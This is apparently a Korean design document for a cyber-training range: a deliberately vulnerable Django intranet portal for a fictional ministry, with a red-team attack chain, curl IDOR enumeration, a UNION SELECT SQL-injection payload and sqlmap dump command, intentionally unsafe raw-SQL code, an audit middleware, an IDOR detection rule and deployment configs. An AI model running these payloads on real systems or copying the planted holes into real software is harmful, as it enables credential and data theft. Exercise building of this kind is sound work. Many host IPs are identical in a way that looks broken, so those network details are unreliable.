## 1. 개요

### 1.1 자산 목적

내부 업무 포털은 가상국가 발도리아(Valdoria)의 행정안전부(MOIS) 직원이 일상 업무를 수행하는 인트라넷 웹 애플리케이션이다. Active Directory(corp.mois.local) 통합 인증을 기반으로 다음 핵심 업무 기능을 제공한다:

- **전자 결재**: 기안 작성, 결재선 설정, 승인/반려
- **공지사항/게시판**: 부서별 공지, 전체 공지 등록 및 열람
- **업무 요청**: 타 부서 업무 협조 요청 및 진행상황 추적
- **사용자/조직 관리**: 직원 프로필 조회, 부서 정보, 조직도
- **검색**: 공지사항, 결재 문서, 사용자 통합 검색

### 1.2 훈련에서의 역할

이 자산은 레드팀의 **내부 횡이동(Lateral Movement) 핵심 거점**이다. 공격자가 DMZ 침투(STEP 1) 및 INT 초기 진입(STEP 2-1, 2-2) 이후, 이 포털의 취약점을 활용하여 AD 계정 정보를 탈취하고, 웹메일(192.168.92.204)을 통한 내부 피싱 공격의 기반을 마련한다.

### 1.3 공격 체인 내 위치

```
[민원 처리 서버 (INT, 192.168.92.204)]  ◀── STEP 2-1: 역셸 확보, DB 크리덴셜 탈취
    │
    │ 내부망 정찰 (nmap)
    ▼
[★ 내부 업무 포털 (INT, 192.168.92.204)]  ◀── STEP 2-3: IDOR, SQLi, Admin API 악용
    │                                              ├─ 전 직원 계정 정보 탈취
    │                                              ├─ 관리자 백도어 계정 생성
    │                                              └─ AD 크리덴셜 재사용 확인
    │
    │ 동일 AD 계정 재사용
    ▼
[웹메일 서버 (INT, 192.168.92.204)]       ◀── STEP 2-4: 탈취 계정으로 로그인, 피싱 메일 발송
    │
    ▼
[업무용 PC → AD 서버 → OT망]              ◀── STEP 3+: 추가 횡이동
```

### 1.4 핵심 공격 벡터 요약

| 취약점 | 유형 | 공격 효과 |
|--------|------|-----------|
| IDOR | /api/user/{id}/profile | 타 사용자 개인정보 열람 (이메일, 직급, 부서) |
| SQL Injection | /api/search?keyword= | DB 전체 덤프 (users 테이블 포함) |
| 인증 미적용 Admin API | /api/admin/export-users, /api/admin/create-user | 전 직원 목록 탈취, 백도어 계정 생성 |
| AD 계정 재사용 | 동일 크리덴셜 | 웹메일(192.168.92.204)에 동일 ID/PW 로그인 가능 |

## 4. 네트워크 설정

### 4.1 인터페이스 구성

| 인터페이스 | IP 주소 | 서브넷 | 게이트웨이 | 용도 |
|-----------|---------|--------|-----------|------|
| ens160 (eth0) | 192.168.92.204 | /24 | 192.168.92.204 | INT 내부 네트워크 |

- 기본 게이트웨이: 192.168.92.204 (OPNSense-2 INT 측 인터페이스)
- DNS: 192.168.92.209 (AD 서버가 DNS 역할 겸용)

### 4.2 리스닝 포트

| 포트 | 프로토콜 | 서비스 | 바인드 주소 | 비고 |
|------|---------|--------|------------|------|
| 80 | TCP/HTTP | Nginx | 0.0.0.0 | 포트 8080으로 리다이렉트 또는 직접 서빙 |
| 8080 | TCP/HTTP | Nginx | 0.0.0.0 | 메인 서비스 포트 |
| 8000 | TCP/HTTP | Gunicorn | 127.0.0.1 | Django (로컬 전용, Nginx에서만 프록시) |
| 22 | TCP/SSH | OpenSSH | 0.0.0.0 | 관리용 |

### 4.3 방화벽 규칙 (OPNSense-2 기준, DMZ → INT)

| 순번 | 출발지 | 목적지 | 포트 | 프로토콜 | 동작 | 비고 |
|------|--------|--------|------|---------|------|------|
| 1 | 192.168.92.0/24 | 192.168.92.204 | 80, 8080 | TCP | ALLOW | INT 내부 웹 접근 |
| 2 | 192.168.92.0/24 | 192.168.92.204 | ANY | TCP | DROP | DMZ에서 직접 접근 차단 |
| 3 | 192.168.92.204 | 192.168.92.208 | 5432 | TCP | ALLOW | PostgreSQL DB 연결 |
| 4 | 192.168.92.204 | 192.168.92.209 | 389 | TCP | ALLOW | LDAP/AD 인증 |
| 5 | 192.168.92.204 | 192.168.92.209 | 88 | TCP/UDP | ALLOW | Kerberos 인증 |

> **참고**: 이 서버는 INT 내부 전용이므로 외부(인터넷)에서 직접 접근할 수 없다. 공격자는 반드시 DMZ 침투 후 INT 내부에 교두보를 확보한 상태(STEP 2-1 완료)에서 접근해야 한다.

#### GET /api/user/{user_id}/profile -- [취약: IDOR]

타 사용자의 프로필을 인증된 사용자의 ID와 무관하게 조회할 수 있다.

| 항목 | 내용 |
|------|------|
| 인증 | 세션 필요 (로그인만 하면 됨) |
| 취약점 | 경로의 {user_id}와 세션 사용자 ID 비교 없음 |

**공격 예시:**
```bash
# 자신의 프로필 (정상)
curl -b "sessionid=abc123" http://intranet.mois.local:8080/api/user/5/profile

# 타인의 프로필 (IDOR - 동일 세션으로 타 사용자 조회 가능)
curl -b "sessionid=abc123" http://intranet.mois.local:8080/api/user/1/profile
curl -b "sessionid=abc123" http://intranet.mois.local:8080/api/user/2/profile
# ... user_id를 순차적으로 열거하여 전 직원 정보 수집
```

**응답 (200 OK):**
```json

  "id": 1,
  "username": "admin_park",
  "name": "박관리",
  "email": "admin_park@corp.mois.local",
```

#### GET /api/search?keyword= -- [취약: SQL Injection]

통합 검색 기능. `keyword` 파라미터가 raw SQL에 직접 삽입된다.

| 항목 | 내용 |
|------|------|
| 인증 | 필요 (세션 기반) |
| 취약점 | keyword 파라미터가 Django ORM이 아닌 raw SQL에 직접 삽입 |

**공격 예시:**
```bash
# 정상 검색
curl -b "sessionid=abc123" \
  "http://intranet.mois.local:8080/api/search?keyword=보안교육"

# SQL Injection - UNION SELECT로 사용자 테이블 덤프
curl -b "sessionid=abc123" \
  "http://intranet.mois.local:8080/api/search?keyword=test' UNION SELECT id,username,password,email,4,5 FROM auth_user--"

# sqlmap 자동화
sqlmap -u "http://intranet.mois.local:8080/api/search?keyword=test" \
  --cookie="sessionid=abc123" --level=3 --risk=2 --dump
```

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated
from django.db import connection


class SearchAPIView(APIView):
    """
    통합 검색 API
    [취약점] keyword 파라미터를 raw SQL에 직접 삽입 (파라미터 바인딩 미사용)
    """
    permission_classes = [IsAuthenticated]

    def get(self, request):
        keyword = request.query_params.get('keyword', '')
        search_type = request.query_params.get('type', 'all')

        if not keyword:
            return Response({"error": "검색어를 입력해 주세요."}, status=400)

        results = []

        with connection.cursor() as cursor:
            # ============================================
            # 취약점: f-string으로 SQL 직접 조립
            # 안전한 방법: cursor.execute("... WHERE title LIKE %s", [f'%{keyword}%'])
            # ============================================

            if search_type in ('all', 'notice'):
                # 공지사항 검색 (취약한 raw SQL)
                sql = f"""
                    SELECT id, title, content, created_at, 'notice' as type
                    FROM notices_notice
                    WHERE title LIKE '%{keyword}%'
                       OR content LIKE '%{keyword}%'
                    ORDER BY created_at DESC
                    LIMIT 20
                """
                cursor.execute(sql)
                columns = [col[0] for col in cursor.description]
                for row in cursor.fetchall():
                    results.append(dict(zip(columns, row)))

            if search_type in ('all', 'approval'):
                # 결재 문서 검색 (취약한 raw SQL)
                sql = f"""
                    SELECT id, title, status, created_at, 'approval' as type
                    FROM approvals_approval
                    WHERE title LIKE '%{keyword}%'
                    ORDER BY created_at DESC
                    LIMIT 20
                """
                cursor.execute(sql)
                columns = [col[0] for col in cursor.description]
                for row in cursor.fetchall():
                    results.append(dict(zip(columns, row)))

            if search_type in ('all', 'user'):
                # 사용자 검색 (취약한 raw SQL - 비밀번호 해시 포함 테이블)
                sql = f"""
                    SELECT u.id, u.username, u.first_name, u.email,
                           p.department, p.position
                    FROM auth_user u
                    LEFT JOIN accounts_userprofile p ON u.id = p.user_id
                    WHERE u.first_name LIKE '%{keyword}%'
                       OR u.username LIKE '%{keyword}%'
                       OR p.department LIKE '%{keyword}%'
                    ORDER BY u.first_name
                    LIMIT 20
                """
                cursor.execute(sql)
                columns = [col[0] for col in cursor.description]
                for row in cursor.fetchall():
                    results.append(dict(zip(columns, row)))

        return Response({
            "keyword": keyword,
            "type": search_type,
            "total": len(results),
            "results": results
        })
```

```python
# core/middleware.py
import logging
import json
from datetime import datetime

audit_logger = logging.getLogger('audit')

class AuditLogMiddleware:
    """
    감사 대상 경로에 대한 요청을 로그로 기록한다.
    """
    AUDIT_PATHS = [
        '/api/user/',
        '/api/admin/',
        '/api/approvals/',
        '/api/search',
    ]

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)

        for path in self.AUDIT_PATHS:
            if request.path.startswith(path):
                audit_logger.info(json.dumps({
                    "timestamp": datetime.now().isoformat(),
                    "user": str(request.user),
                    "method": request.method,
                    "path": request.get_full_path(),
                    "status": response.status_code,
                    "ip": request.META.get('REMOTE_ADDR'),
                    "user_agent": request.META.get('HTTP_USER_AGENT', ''),
                }))
                break

        return response
```

#### 탐지 #1: IDOR 공격 (프로필 연속 조회)

**징후**: 동일 세션에서 다수의 서로 다른 user_id에 대해 `/api/user/{id}/profile` 연속 요청

```bash
# 5분 내 10건 이상 서로 다른 user_id를 조회한 IP 추출
awk '/\/api\/user\/[0-9]+\/profile/ {
    match($7, /\/api\/user\/([0-9]+)\/profile/, arr);
    key = $1 "|" arr[1];
    if (!seen[key]++) {
        ip_count[$1]++;
    }
}
END {
    for (ip in ip_count)
        if (ip_count[ip] >= 10)
            print "ALERT: IDOR suspect -", ip, "queried", ip_count[ip], "distinct profiles";
}' /var/log/nginx/intranet-access.log
```

### 10.2 systemd 서비스 파일 (intranet-portal.service)

```ini
[Unit]
Description=MOIS Intranet Portal (Gunicorn + Django)
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/opt/intranet-portal/src/intranet_portal
EnvironmentFile=/opt/intranet-portal/.env
ExecStart=/opt/intranet-portal/venv/bin/gunicorn \
    intranet_portal.wsgi:application \
    --workers 4 \
    --bind 127.0.0.1:8000 \
    --timeout 120 \
    --access-logfile /var/log/intranet-portal/gunicorn-access.log \
    --error-logfile /var/log/intranet-portal/gunicorn-error.log
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### 10.3 Nginx 설정 (intranet.conf)

```nginx
# /etc/nginx/sites-available/intranet.conf

server {
    listen 80;
    server_name intranet.mois.local 192.168.92.204;

    # 포트 80은 8080으로 리다이렉트하거나 동일하게 서빙
    # (내부망이므로 TLS 미적용 - 의도적 취약 설정)
    return 301 http://$host:8080$request_uri;
}

server {
    listen 8080;
    server_name intranet.mois.local 192.168.92.204;

    client_max_body_size 20M;

    # 정적 파일
    location /static/ {
        alias /var/www/intranet/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }

    location /media/ {
        alias /opt/intranet-portal/src/intranet_portal/media/;
    }

    # Django 애플리케이션
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60;
        proxy_read_timeout 120;
    }

    # 로그
    access_log /var/log/nginx/intranet-access.log detailed;
    error_log /var/log/nginx/intranet-error.log warn;
}
```

### 10.4 setup.sh 배포 스크립트

```bash
#!/bin/bash
# ===================================================================
# 내부 업무 포털 (Internal Business Portal) 원클릭 배포 스크립트
# 대상: Ubuntu 22.04 LTS
# 용도: 사이버 훈련 환경 구축
# ===================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
APP_DIR="/opt/intranet-portal"
STATIC_DIR="/var/www/intranet/static"
LOG_DIR="/var/log/intranet-portal"

echo "============================================"
echo " 내부 업무 포털 배포 시작"
echo " $(date '+%Y-%m-%d %H:%M:%S')"
echo "============================================"

# 1. 시스템 패키지 설치
echo "[1/10] 시스템 패키지 설치..."
apt-get update -qq
apt-get install -y -qq \
    python3 python3-pip python3-venv \
    nginx \
    libldap2-dev libsasl2-dev \
    libpq-dev \
    curl

# 2. 애플리케이션 디렉토리 생성
echo "[2/10] 디렉토리 구조 생성..."
mkdir -p "$APP_DIR"
mkdir -p "$STATIC_DIR"
mkdir -p "$LOG_DIR"
chown www-data:www-data "$LOG_DIR"

# 3. 소스 코드 복사
echo "[3/10] 소스 코드 복사..."
cp -r "$SCRIPT_DIR/src/intranet_portal" "$APP_DIR/src/"

# 4. 환경변수 설정
echo "[4/10] 환경변수 설정..."
if [ ! -f "$APP_DIR/.env" ]; then
    cp "$SCRIPT_DIR/.env.example" "$APP_DIR/.env"
    echo "  → .env 파일을 확인하고 필요시 수정하세요."
fi

# 5. Python 가상환경 및 의존성 설치
echo "[5/10] Python 가상환경 설정..."
python3 -m venv "$APP_DIR/venv"
source "$APP_DIR/venv/bin/activate"
pip install --quiet --upgrade pip
pip install --quiet -r "$SCRIPT_DIR/src/requirements.txt"

# 6. Django 마이그레이션 및 정적 파일 수집
echo "[6/10] Django 초기화..."
cd "$APP_DIR/src/intranet_portal"
python manage.py migrate --noinput
python manage.py collectstatic --noinput --clear
python manage.py loaddata fixtures/departments.json
python manage.py loaddata fixtures/users.json
python manage.py loaddata fixtures/notices.json
python manage.py loaddata fixtures/approvals.json

# 7. Nginx 설정
echo "[7/10] Nginx 설정..."
cp "$SCRIPT_DIR/conf/nginx/intranet.conf" /etc/nginx/sites-available/
ln -sf /etc/nginx/sites-available/intranet.conf /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t
systemctl restart nginx

# 8. systemd 서비스 등록
echo "[8/10] systemd 서비스 등록..."
cp "$SCRIPT_DIR/conf/systemd/intranet-portal.service" /etc/systemd/system/
systemctl daemon-reload
systemctl enable intranet-portal
systemctl start intranet-portal

# 9. 호스트 파일 설정
echo "[9/10] 호스트 파일 설정..."
if ! grep -q "intranet.mois.local" /etc/hosts; then
    echo "192.168.92.204  intranet.mois.local" >> /etc/hosts
    echo "192.168.92.204  mail.mois.local" >> /etc/hosts
    echo "192.168.92.208  db.mois.local" >> /etc/hosts
    echo "192.168.92.209  corp.mois.local dc01.corp.mois.local" >> /etc/hosts
fi

# 10. 서비스 상태 확인
echo "[10/10] 서비스 상태 확인..."
sleep 3
systemctl status intranet-portal --no-pager || true
curl -s -o /dev/null -w "HTTP %{http_code}" http://localhost:8080/ && echo " - 포털 정상 응답" || echo " - 포털 응답 실패"

echo ""
echo "============================================"
echo " 배포 완료!"
echo " 포털 URL: http://192.168.92.204:8080"
echo " 로그: $LOG_DIR/"
echo "============================================"
```

```html
<script>
$(document).ready(function() {
    // URL에서 user_id 추출
    const pathParts = window.location.pathname.split('/');
    const userId = pathParts[3] || '{{ request.user.id }}';

    // [취약점] API 호출 시 user_id를 URL에서 그대로 사용
    // 서버 측에서도 권한 검증 없음 (IDOR)
    $.ajax({
        url: '/api/user/' + userId + '/profile',
        method: 'GET',
        success: function(data) {
```

```html
$(document).ready(function() {
    const keyword = new URLSearchParams(window.location.search).get('keyword');
    const type = new URLSearchParams(window.location.search).get('type') || 'all';

    if (!keyword) return;

    // [취약점] keyword를 서버로 전달 → raw SQL에 삽입됨
    $.ajax({
        url: '/api/search',
        data: { keyword: keyword, type: type },
        success: function(data) {
            renderResults(data.results);
            $('#result-count').text(data.total + '건');

        error: function(xhr) {
            // [취약점] 서버 오류 메시지를 그대로 표시 (SQL 오류 메시지 노출)
            $('#results-area').html(
                '<div class="alert alert-danger">' + xhr.responseText + '</div>'
            );
        }
    });

    function renderResults(results) {
        results.forEach(function(item) {
            if (item.type === 'user') {
                // [취약점] 검색 결과에서 사용자 프로필 링크가 ID 기반
```

## 부록 A: DB 스키마 (mois_intranet)

```sql
-- PostgreSQL 초기 스키마
-- Django가 migrate로 자동 생성하나, 참고용으로 명시

-- 사용자 확장 프로필 (Django auth_user 확장)
CREATE TABLE accounts_userprofile (
    id SERIAL PRIMARY KEY,
    user_id INTEGER UNIQUE REFERENCES auth_user(id) ON DELETE CASCADE,
    department VARCHAR(100),
    position VARCHAR(50),
    phone VARCHAR(20),
    employee_number VARCHAR(30),
    joined_at DATE,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- 공지사항
CREATE TABLE notices_notice (
    id SERIAL PRIMARY KEY,
    title VARCHAR(200) NOT NULL,
    content TEXT NOT NULL,
    category VARCHAR(50) DEFAULT '일반',
    department VARCHAR(100),
    author_id INTEGER REFERENCES auth_user(id),
    is_pinned BOOLEAN DEFAULT FALSE,
    view_count INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- 공지사항 첨부파일
CREATE TABLE notices_attachment (
    id SERIAL PRIMARY KEY,
    notice_id INTEGER REFERENCES notices_notice(id) ON DELETE CASCADE,
    filename VARCHAR(255),
    file_path VARCHAR(500),
    file_size INTEGER,
    uploaded_at TIMESTAMP DEFAULT NOW()
);

-- 전자결재
CREATE TABLE approvals_approval (
    id SERIAL PRIMARY KEY,
    title VARCHAR(200) NOT NULL,
    content TEXT NOT NULL,
    type VARCHAR(20) DEFAULT 'general',  -- general, leave, expense
    status VARCHAR(20) DEFAULT 'draft',   -- draft, pending, approved, rejected
    requester_id INTEGER REFERENCES auth_user(id),
    amount DECIMAL(12, 0),
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- 결재선
CREATE TABLE approvals_approvalline (
    id SERIAL PRIMARY KEY,
    approval_id INTEGER REFERENCES approvals_approval(id) ON DELETE CASCADE,
```
